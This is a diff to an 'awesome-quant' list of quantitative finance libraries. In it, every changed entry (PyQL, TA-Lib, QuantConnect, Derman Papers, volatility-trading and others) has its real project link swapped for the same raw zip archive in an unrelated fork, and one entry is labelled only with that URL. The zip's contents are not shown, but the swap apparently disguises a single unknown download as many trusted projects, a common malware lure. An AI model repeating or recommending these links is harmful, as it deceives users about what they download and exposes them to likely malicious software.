+	- [PyQL](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Python port.
+	- [https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Julia port.
+- [TA-Lib](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - perform technical analysis of financial market data.
 
 ## CSharp
 
-- [QuantConnect](https://github.com/QuantConnect/Lean) - Lean Engine is an open-source fully managed C# algorithmic trading engine built for desktop and cloud usage.
+- [QuantConnect](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Lean Engine is an open-source fully managed C# algorithmic trading engine built for desktop and cloud usage.
 
 ## Reproducing Works
 
-- [Derman Papers](https://github.com/MarcosCarreira/DermanPapers) - Notebooks that replicate original quantitative finance papers from Emanuel Derman.
-- [volatility-trading](https://github.com/jasonstrimpel/volatility-trading) - A complete set of volatility estimators based on Euan Sinclair's Volatility Trading.
-- [quant](https://github.com/paulperry/quant) - Quantitative Finance and Algorithmic Trading exhaust; mostly ipython notebooks based on Quantopian, Zipline, or Pandas.
-- [fecon235](https://github.com/rsvp/fecon235) - Open source project for software tools in financial economics. Many jupyter notebook to verify theoretical ideas and practical methods interactively.
+- [Derman Papers](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Notebooks that replicate original quantitative finance papers from Emanuel Derman.
+- [volatility-trading](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - A complete set of volatility estimators based on Euan Sinclair's Volatility Trading.
+- [quant](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Quantitative Finance and Algorithmic Trading exhaust; mostly ipython notebooks based on Quantopian, Zipline, or Pandas.
+- [fecon235](https://raw.githubusercontent.com/Joe-Mogul/awesome-quant/master/metopon/awesome-quant-3.5.zip) - Open source project for software tools in financial economics. Many jupyter notebook to verify theoretical ideas and practical methods interactively.
